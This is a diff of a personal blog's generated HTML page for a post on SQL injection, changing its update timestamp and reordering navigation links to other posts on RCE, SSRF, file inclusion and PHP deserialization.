         <p><span>发布时间:</span>2026年07月02日 - 21时02分</p>
-        <p><span>最后更新:</span>2026年07月02日 - 22时20分</p>
+        <p><span>最后更新:</span>2026年07月02日 - 23时24分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2026/07/02/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">https://worny666.github.io/2026/07/02/SQL%E6%B3%A8%E5%85%A5/</a>
             <span class="copy-path" data-clipboard-text="原文: https://worny666.github.io/2026/07/02/SQL%E6%B3%A8%E5%85%A5/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -618,11 +618,11 @@
 
 <nav id="article-nav">
   
-    <a href="/2026/07/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2026/07/02/RCE/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          文件包含
+          RCE
         
       </div>
     </a>
@@ -681,7 +681,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2026/07/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="上一篇: 文件包含">
+            <a href="/2026/07/02/RCE/" title="上一篇: RCE">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -692,7 +692,7 @@
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/RCE/">RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/SSRF/">SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/04/12/MyFirstBlog/">MyFirstBlog</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/SSRF/">SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/RCE/">RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/07/02/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2026/04/12/MyFirstBlog/">MyFirstBlog</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
